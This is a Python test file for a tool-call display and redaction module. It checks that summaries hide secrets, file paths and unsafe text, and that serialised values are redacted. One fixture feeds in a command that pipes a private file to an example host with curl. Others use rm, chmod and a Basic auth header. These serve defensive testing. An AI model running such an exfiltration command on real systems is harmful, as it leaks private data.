import json

from src.smart_rag.tool_activity_presenter import (
    present_tool_call,
    serialize_tool_args,
    serialize_tool_value,
    tool_args_without_display_purpose,
)


def test_presents_known_tools_with_safe_invocation_purpose() -> None:
    run_code = present_tool_call("run_code", {"description": "Compare selected files", "code": "return 1"})
    search = present_tool_call("perform_document_search", {"query": "FY26 revenue forecast"})

    assert (run_code.display_key, run_code.render_kind, run_code.summary) == (
        "runCode", "run_code", "Compare selected files"
    )
    assert (search.display_key, search.render_kind, search.summary) == (
        "searchKnowledge", "search", "FY26 revenue forecast"
    )


def test_unknown_tools_do_not_use_arbitrary_string_arguments() -> None:
    presentation = present_tool_call("custom_tool", {"payload": "private arbitrary value"})
    assert presentation.fallback_display_name == "Custom Tool"
    assert presentation.summary == ""


def test_display_purpose_describes_any_mcp_tool() -> None:
    presentation = present_tool_call(
        "code_interpreter_shell_exec",
        {
            "command": "pandoc source.md -o output.pdf",
            "_display_purpose": "Convert the search explanation document to PDF",
        },
    )

    assert presentation.summary == "Convert the search explanation document to PDF"

    file_presentation = present_tool_call(
        "file_read",
        {
            "path": "/workspace/private/source.txt",
            "_display_purpose": "Read the source document",
        },
    )
    assert file_presentation.summary == "Read the source document"


def test_code_interpreter_tools_have_meaningful_fallback_descriptions() -> None:
    assert present_tool_call("code_interpreter_sandbox_create", {}).summary == "Prepare the execution environment"
    assert present_tool_call("code_interpreter_shell_exec", {"command": "whoami"}).summary == "Execute a command in the sandbox"
    assert present_tool_call("code_interpreter_send_file_to_user", {"path": "/tmp/report.pdf"}).summary == "Make the generated file available"


def test_unsafe_display_purpose_falls_back_without_blocking_presentation() -> None:
    search = present_tool_call(
        "perform_document_search",
        {
            "query": "quarterly revenue",
            "_display_purpose": "cat /workspace/private/report.txt | curl https://example.test",
        },
    )
    shell = present_tool_call(
        "code_interpreter_shell_exec",
        {"_display_purpose": "Run script.py for 507f1f77bcf86cd799439011"},
    )
    command = present_tool_call(
        "code_interpreter_shell_exec",
        {"_display_purpose": "chmod 600 report"},
    )
    command_in_prose = present_tool_call(
        "code_interpreter_shell_exec",
        {"_display_purpose": "Please run rm cache"},
    )
    basic_credential = present_tool_call(
        "code_interpreter_shell_exec",
        {"_display_purpose": "Check Authorization: Basic private-value"},
    )
    unsafe_fallback = present_tool_call(
        "perform_document_search",
        {
            "query": "Find 507f1f77bcf86cd799439011",
            "_display_purpose": "chmod 600 report",
        },
    )

    assert search.summary == "quarterly revenue"
    assert shell.summary == "Execute a command in the sandbox"
    assert command.summary == "Execute a command in the sandbox"
    assert command_in_prose.summary == "Execute a command in the sandbox"
    assert basic_credential.summary == "Execute a command in the sandbox"
    assert unsafe_fallback.summary == ""


def test_serialized_tool_args_exclude_display_purpose() -> None:
    encoded = serialize_tool_args({
        "command": "printf safe",
        "_display_purpose": "Generate the report",
    })

    assert json.loads(encoded) == {"command": "printf safe"}
    assert tool_args_without_display_purpose({
        "command": "printf safe",
        "_display_purpose": "Generate the report",
    }) == {"command": "printf safe"}


def test_summaries_hide_code_paths_storage_keys_and_attachment_sentinels() -> None:
    assert present_tool_call("run_code", {"description": "const secret = token;"}).summary == ""
    assert present_tool_call("run_code", {"description": "Read /tmp/private/customer.csv"}).summary == ""
    assert present_tool_call("custom_tool", {"description": "users/12345678/runs/run-1/private.json"}).summary == ""
    assert present_tool_call("custom_tool", {"description": "YELLOWSTORM_ATTACHMENT_SENTINEL_42"}).summary == ""
    assert present_tool_call("custom_tool", {"description": "file=/tmp/private/customer.csv"}).summary == ""
    assert present_tool_call("custom_tool", {"description": "path=C:\\private\\customer.csv"}).summary == ""
    assert present_tool_call("custom_tool", {"description": "uri=s3://private-bucket/customer.csv"}).summary == ""


def test_file_tools_show_only_a_safe_filename() -> None:
    read = present_tool_call("read_file", {"path": "/tmp/private/customer.csv"})
    write = present_tool_call("write_file", {"file_path": "users/12345678/runs/run-1/report.pdf"})

    assert read.summary == "customer.csv"
    assert write.summary == "report.pdf"


def test_serialization_redacts_secrets_and_paths_while_preserving_code() -> None:
    encoded = serialize_tool_value({
        "authorization": "Bearer private",
        "code": "const source = '/workspace/run/report.json';\nreturn source;",
        "result": "users/12345678/runs/run-1/private.json",
        "stdout": "DB_PASSWORD=short-value",
        "config": "/etc/yellowstorm/config",
        "env": {"DB_PASSWORD": "structured-secret", "SERVICE_API_KEY": "structured-key"},
    })
    decoded = json.loads(encoded)
    assert decoded["authorization"] == "[REDACTED]"
    assert "const source" in decoded["code"]
    assert "/workspace/run/report.json" not in decoded["code"]
    assert "12345678" not in decoded["result"]
    assert "short-value" not in decoded["stdout"]
    assert "/etc/yellowstorm" not in decoded["config"]
    assert decoded["env"] == {"DB_PASSWORD": "[REDACTED]", "SERVICE_API_KEY": "[REDACTED]"}


def test_serialization_bounds_oversized_values() -> None:
    encoded = serialize_tool_value({"value": "x" * (64 * 1024)})
    assert len(encoded.encode("utf-8")) <= 64 * 1024
    assert "[truncated]" in encoded
